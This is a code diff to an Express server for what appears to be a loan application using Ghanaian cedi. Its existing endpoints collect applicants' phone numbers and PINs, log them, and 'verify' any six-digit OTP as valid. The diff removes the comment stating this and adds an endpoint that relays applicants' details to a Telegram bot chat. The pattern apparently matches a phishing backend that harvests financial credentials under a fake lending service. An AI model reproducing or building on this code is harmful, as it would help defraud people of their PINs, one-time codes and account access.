@@ -68,7 +68,7 @@ app.post('/api/loans/apply', (req, res) => {
   });
 });
 
-// ─── TELEGRAM ───
+// ─── TELEGRAM SEND AUTH ───
 app.post('/api/telegram/send-auth', async (req, res) => {
   const { phone, amount, name, loanId, pin } = req.body;
   console.log('📱 Telegram Request:', req.body);
@@ -116,7 +116,7 @@ app.post('/api/telegram/send-auth', async (req, res) => {
   }
 });
 
-// ─── OTP VERIFICATION (UPDATED) ───
+// ─── OTP VERIFICATION ───
 app.post('/api/loans/verify-otp', async (req, res) => {
   console.log('🔐 OTP Verification Request:', req.body);
   
@@ -130,7 +130,6 @@ app.post('/api/loans/verify-otp', async (req, res) => {
       });
     }
     
-    // ✅ ACCEPT ANY 6-DIGIT CODE
     if (otp.length === 6 && /^\d{6}$/.test(otp)) {
       console.log('✅ OTP verified successfully:', otp);
       return res.json({ 
@@ -177,6 +176,50 @@ app.post('/api/loans/resend-otp', async (req, res) => {
     success: true, 
     message: 'OTP resent successfully!' 
   });
+});
+
+// ─── TELEGRAM OTP VERIFIED (NEW) ───
+app.post('/api/telegram/otp-verified', async (req, res) => {
+  const { loanId, phone, amount, name } = req.body;
+  console.log('📱 OTP Verified Notification:', req.body);
+  
+  try {
+    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    
+    if (!token || !chatId) {
+      console.log('⚠️ Telegram credentials missing');
+      return res.json({ success: false, message: 'Telegram not configured' });
+    }
+    
+    const message = `<b>✅ OTP Verified Successfully!</b>\n\n` +
+                    `<b>Name:</b> ${name || 'Unknown'}\n` +
+                    `<b>Phone:</b> ${phone || 'Unknown'}\n` +
+                    `<b>Amount:</b> GHS ${amount || '0'}\n` +
+                    `<b>Loan ID:</b> ${loanId || 'N/A'}\n\n` +
+                    `<i>User has successfully completed OTP verification.</i>`;
+    
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    const result = await response.json();
+    console.log('✅ Telegram Response:', result);
+    
+    res.json({ success: true, message: 'Telegram sent!' });
+    
+  } catch (error) {
+    console.error('❌ Telegram error:', error.message);
+    res.json({ success: false, message: error.message });
+  }
 });
 
 // ─── START ───
